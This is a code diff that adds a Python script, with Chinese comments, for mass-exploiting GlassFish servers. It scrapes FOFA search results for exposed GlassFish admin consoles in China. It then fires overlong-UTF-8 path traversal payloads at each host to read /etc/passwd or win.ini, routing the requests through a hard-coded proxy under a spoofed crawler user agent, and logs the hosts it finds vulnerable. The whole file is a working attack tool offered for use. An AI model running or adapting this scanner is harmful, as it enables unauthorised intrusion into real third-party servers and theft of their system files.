@@ -1,0 +1,58 @@
+import requests
+import base64
+from lxml import etree
+import time
+
+search_data='"glassfish" && port="4848" && country="CN"'
+url='https://fofa.info/result?qbase64='
+header={
+'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+'Cookie': '',
+}
+search_data_bs=base64.b64encode(search_data.encode('utf-8')).decode('utf-8')
+
+for page in range(1,7):
+    yesu='&page='+str(page)+'&page_size=10'
+    urls=url+search_data_bs+yesu
+    try:
+        result=requests.get(urls,headers=header).content
+        #将返回的字符串利用lxml解析为html文档
+        html=etree.HTML(result)
+        ip_data=html.xpath('//a[@target="_blank"]/@href')#返回的列表形式
+        ip_data='\n'.join(ip_data)#
+        print('正在提取第'+str(page)+'页')
+        #将字符串写入文本，a+意味着在文本的末尾追加内容
+        with open(r'ip.txt','a+',encoding='utf-8') as f1:
+            f1.write(ip_data+'\n')
+            f1.close()
+        time.sleep(0.1)
+    except Exception as e:
+        time.sleep(0.5)
+        pass
+
+print("ip获取成功，接下来进行poc验证")
+
+for ip in open(r"ip.txt"):
+    ip=ip.replace('\n','')
+    payload_linux='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    payload_windows='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
+    headers = {"User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"}
+    proxy={'http':'101.200.127.149:3129'}
+    try:
+        data_linux=requests.get(ip+payload_linux,headers=headers,proxies=proxy).status_code
+        data_windows=requests.get(ip+payload_windows,headers=headers,proxies=proxy).status_code
+        print('check>'+ip)
+        if data_linux==200:
+            print(ip+"的galssfish存在Linux漏洞")
+            with open(r'vuln.txt','a+',encoding='utf-8') as f2:
+                f2.write(ip+"的galssfish存在Linux漏洞"+'\n')
+                f2.close()
+        elif data_windows==200:
+            print(ip+"的galssfish存在windows漏洞")
+            with open(r'vuln.txt','a+',encoding='utf-8') as f2:
+                f2.write(ip+"的galssfish存在Windows漏洞"+'\n')
+                f2.close()
+        else:
+            print(ip+'的galssfish不存在漏洞')
+    except Exception as e:
+        time.sleep(0.1)
